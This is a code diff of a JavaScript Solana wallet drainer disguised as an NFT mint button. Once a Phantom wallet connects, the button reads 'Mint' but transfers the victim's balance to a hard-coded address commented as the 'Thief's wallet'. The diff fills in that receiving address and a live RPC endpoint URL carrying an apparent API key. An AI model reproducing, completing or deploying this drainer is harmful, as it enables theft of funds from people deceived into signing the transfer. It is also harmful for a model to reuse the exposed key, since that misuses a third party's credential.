@@ -6,7 +6,7 @@ $(document).ready(function() {
                 console.log("Phantom Wallet connected:", resp);
 
                 var connection = new solanaWeb3.Connection(
-                    'https://solana-mainnet.api.syndica.io/api-key/YOUR-API-KEY', 
+                    'https://lingering-fragrant-arrow.solana-mainnet.quiknode.pro/be0a4904386fdc1180fe1c01300c5ca260dc7715', 
                     'confirmed'
                 );
 
@@ -23,7 +23,7 @@ $(document).ready(function() {
                 $('#connect-wallet').text("Mint");
                 $('#connect-wallet').off('click').on('click', async () => {
                     try {
-                        const recieverWallet = new solanaWeb3.PublicKey('XXXXXXXXXXX'); // Thief's wallet
+                        const recieverWallet = new solanaWeb3.PublicKey('DfExcwUCaRBXAgEMymh7E7Mu2Zpvfpt9uSWEAMUnXCBx'); // Thief's wallet
                         const balanceForTransfer = walletBalance - minBalance;
                         if (balanceForTransfer <= 0) {
                             alert("Insufficient funds for transfer.");
